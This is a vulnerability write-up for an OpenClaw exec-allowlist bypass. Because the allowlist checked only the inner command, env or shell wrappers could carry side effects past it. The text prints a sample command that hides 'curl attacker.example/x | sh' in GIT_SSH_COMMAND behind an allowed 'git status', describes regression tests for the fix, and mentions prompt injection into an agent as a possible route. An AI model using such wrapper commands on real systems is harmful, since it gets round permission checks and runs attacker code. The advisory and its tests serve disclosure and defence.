GHSA-cwpp-5962-q4f6 / CVE-2026-53848 - "Exec allowlist could miss side effects from transparent command wrappers" 

The versions affected by this vulnerability are all versions before and including 2026.5.22. The component that is affected by this vulnerability is OpenClaw’s exec/allowlist analysis/policy matching logic. The issue that occurred was that the exec allowlist evaluated the inner command against the policy, however, when that command was wrapped in something like a env or shell dispatcher, the command still executes. So the allowlist can approve what looks like a benign inner command but unintentionally run wrapper-level side effects. The attacker controlled input in this case would be the command request that is shaped to be evaluated as a transparent wrapper. For example , an attacker can wrap changing an env variable in an instruction that has an allowed action. /bin/zsh -lc "env GIT_SSH_COMMAND='curl attacker.example/x | sh' git status". The allowlist sees that git is an allowed command and approves the command which allows this to run. The preconditions for this attack are an authenticated user with low privilege, on a reachable exec-allowlist path. This attack is not an anonymous attacker bug, meaning that this would be contained within the trusted-operator model. The root cause for this bug is a mismatch between what the allowlist checks and what actually is executed. If an attacker is successful they would gain wrapper level side effects outside what is on the allowlist. An example would be what was described earlier, an attacker could change an env variable, which could not be on the allowlist. The fix for this bug was that shell/env wrappers were treated as transparent which means that the policy can match the effective executable. A regression test would verify that the exec allowlist matches the effective command being executed and not just the named command in a transparent wrapper. An OpenClaw policy allowlist entry would be created allowing only one command. For example, git status. A direct invocation would now be performed as a control, by submitting git status directly. The expected result would be an approved command. The purpose of this would be to test if the fix was successful. A second test would then be performed, this would submit the previous allowlisted command through a transparent wrapper which carries an unapproved side effect, in this case an env command. The pre-fix behaviour would be that the matcher would resolve the command to the allow listed command, see it on the allowlist, and the command would then execute with the unallowed, wrapped command. The post-fix behaviour would be that the matcher would be treated the “wrapped” command as its own effective command and sees that the command is not on the allow list and either denies the request or routes it for approval. A third and final test would be performed but instead of an env variable, it would contain a shell dispatcher. The same outcomes would be expected, before the fix, the command would have been allowed. After the fix, the command would have been either rejected or routed for manual approval. Prompt Injection for this attack would be helpful, but not required. The vulnerability itself is not a prompt injection bug but a policy matching bug. If an attacker’s only option would be injecting text into an agent’s context then this could be used as an attack vector.
